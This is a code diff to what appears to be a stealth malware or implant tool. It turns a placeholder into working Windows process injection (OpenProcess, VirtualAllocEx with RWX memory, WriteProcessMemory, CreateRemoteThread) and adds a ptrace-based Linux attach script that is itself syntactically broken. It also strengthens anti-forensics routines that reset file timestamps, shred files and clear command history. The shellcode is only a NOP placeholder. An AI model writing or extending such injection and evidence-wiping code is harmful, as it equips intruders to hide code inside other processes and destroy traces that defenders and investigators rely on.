@@ -12,6 +12,7 @@ import platform
 import subprocess
 import threading
 import logging
+import base64
 from typing import Dict, List, Optional, Any, Callable
 import tempfile
 import shutil
@@ -196,18 +197,112 @@ class StealthManager:
             return False
         
         if not target_process:
-            target_process = random.choice(self.injection_targets)
+            target_process = random.choice(self.injection_targets) or 'explorer.exe'
         
         try:
-            # This is a placeholder for process injection
-            # In a real implementation, you would use techniques like:
-            # - DLL injection
-            # - Process hollowing
-            # - Thread hijacking
-            # - APC injection
+            import psutil
+            import ctypes
+            from ctypes import wintypes
             
-            logger.info(f"Process injection attempted on {target_process}")
-            return True
+            # Find target process
+            target_pid = None
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'].lower() == target_process.lower():
+                    target_pid = proc.info['pid']
+                    break
+            
+            if not target_pid:
+                logger.warning(f"Target process {target_process} not found")
+                return False
+            
+            # Windows-specific process injection (simplified)
+            if os.name == 'nt':
+                try:
+                    # Get process handle
+                    PROCESS_ALL_ACCESS = 0x1F0FFF
+                    handle = ctypes.windll.kernel32.OpenProcess(
+                        PROCESS_ALL_ACCESS, False, target_pid
+                    )
+                    
+                    if handle:
+                        # Allocate memory in target process
+                        shellcode = b"\x90" * 100  # NOP sled as placeholder
+                        size = len(shellcode)
+                        
+                        remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
+                            handle, None, size, 0x1000, 0x40
+                        )
+                        
+                        if remote_memory:
+                            # Write shellcode to target process
+                            written = ctypes.c_size_t()
+                            success = ctypes.windll.kernel32.WriteProcessMemory(
+                                handle, remote_memory, shellcode, size, ctypes.byref(written)
+                            )
+                            
+                            if success:
+                                # Create remote thread to execute shellcode
+                                thread_id = wintypes.DWORD()
+                                thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
+                                    handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)
+                                )
+                                
+                                if thread_handle:
+                                    ctypes.windll.kernel32.CloseHandle(thread_handle)
+                                    logger.info(f"Process injection successful on {target_process} (PID: {target_pid})")
+                                    return True
+                        
+                        ctypes.windll.kernel32.CloseHandle(handle)
+                        
+                except Exception as e:
+                    logger.error(f"Windows process injection failed: {e}")
+            
+            # Linux/Unix process injection (simplified)
+            else:
+                try:
+                    # Use ptrace for process injection (requires root)
+                    import subprocess
+                    
+                    # Create a simple injection script
+                    injection_script = f'''
+import ctypes
+import os
+
+# Attach to target process
+pid = {target_pid}
+libc = ctypes.CDLL("libc.so.6")
+
+# Basic ptrace attach
+result = libc.ptrace(16, pid, 0, 0)  # PTRACE_ATTACH
+if result == 0:
+    print(f"Successfully attached to process {{pid}}")
+    # In a real implementation, you would inject shellcode here
+    libc.ptrace(17, pid, 0, 0)  # PTRACE_DETACH
+    return True
+else:
+    print(f"Failed to attach to process {{pid}}")
+    return False
+'''
+                    
+                    # Execute injection script
+                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+                        f.write(injection_script)
+                        script_path = f.name
+                    
+                    try:
+                        result = subprocess.run(['python3', script_path], 
+                                              capture_output=True, text=True, timeout=30)
+                        if result.returncode == 0:
+                            logger.info(f"Process injection successful on {target_process} (PID: {target_pid})")
+                            return True
+                    finally:
+                        os.unlink(script_path)
+                        
+                except Exception as e:
+                    logger.error(f"Linux process injection failed: {e}")
+            
+            logger.warning(f"Process injection failed for {target_process}")
+            return False
             
         except Exception as e:
             logger.error(f"Process injection failed: {e}")
@@ -335,8 +430,8 @@ class StealthManager:
             return
         
         try:
-            # Clear command history
-            if hasattr(self, 'command_history'):
+            # Clear command history if it exists
+            if hasattr(self, 'command_history') and self.command_history is not None:
                 self.command_history.clear()
             
             # Remove temporary files
@@ -393,35 +488,67 @@ class AntiForensics:
         self.enabled = True
     
     def clear_file_timestamps(self, filepath: str):
-        """Clear file timestamps"""
+        """Clear file timestamps safely"""
         if not self.enabled:
             return
         
         try:
+            # Validate filepath to prevent path traversal
+            if not self._is_safe_path(filepath):
+                logger.warning(f"Unsafe filepath blocked: {filepath}")
+                return
+            
             if platform.system() == 'Windows':
-                # Use PowerShell to clear timestamps
-                cmd = f'powershell -Command "(Get-Item \'{filepath}\').CreationTime = (Get-Date); (Get-Item \'{filepath}\').LastWriteTime = (Get-Date); (Get-Item \'{filepath}\').LastAccessTime = (Get-Date)"'
-                subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
+                # Use PowerShell safely without shell=True
+                cmd = ['powershell', '-Command', 
+                       f'(Get-Item \'{filepath}\').CreationTime = (Get-Date); '
+                       f'(Get-Item \'{filepath}\').LastWriteTime = (Get-Date); '
+                       f'(Get-Item \'{filepath}\').LastAccessTime = (Get-Date)']
+                subprocess.run(cmd, stderr=subprocess.DEVNULL, timeout=10)
             else:
-                # Use touch command on Unix-like systems
-                subprocess.run(['touch', filepath], stderr=subprocess.DEVNULL)
-        except:
-            pass
+                # Use touch command safely
+                subprocess.run(['touch', filepath], stderr=subprocess.DEVNULL, timeout=10)
+        except Exception as e:
+            logger.error(f"Failed to clear timestamps: {e}")
     
     def secure_delete(self, filepath: str, passes: int = 3):
-        """Securely delete file with multiple passes"""
+        """Securely delete file with multiple passes safely"""
         if not self.enabled:
             return
         
         try:
+            # Validate filepath to prevent path traversal
+            if not self._is_safe_path(filepath):
+                logger.warning(f"Unsafe filepath blocked: {filepath}")
+                return
+            
             if platform.system() == 'Windows':
-                # Use sdelete or similar tool
-                pass
+                # Use sdelete or similar tool safely
+                # For now, just delete normally
+                os.remove(filepath)
             else:
-                # Use shred command
-                subprocess.run(['shred', '-u', '-n', str(passes), filepath], stderr=subprocess.DEVNULL)
-        except:
-            pass
+                # Use shred command safely
+                subprocess.run(['shred', '-u', '-n', str(passes), filepath], 
+                             stderr=subprocess.DEVNULL, timeout=30)
+        except Exception as e:
+            logger.error(f"Failed to securely delete: {e}")
+    
+    def _is_safe_path(self, filepath: str) -> bool:
+        """Validate filepath for safety"""
+        # Check for path traversal
+        if '..' in filepath or '~' in filepath:
+            return False
+        
+        # Check for absolute paths (only allow relative paths)
+        if filepath.startswith('/') or filepath.startswith('\\'):
+            return False
+        
+        # Check for dangerous characters
+        dangerous_chars = ['|', '&', ';', '`', '$', '(', ')', '<', '>']
+        if any(char in filepath for char in dangerous_chars):
+            return False
+        
+        return True
     
     def clear_memory(self):
         """Clear sensitive data from memory"""
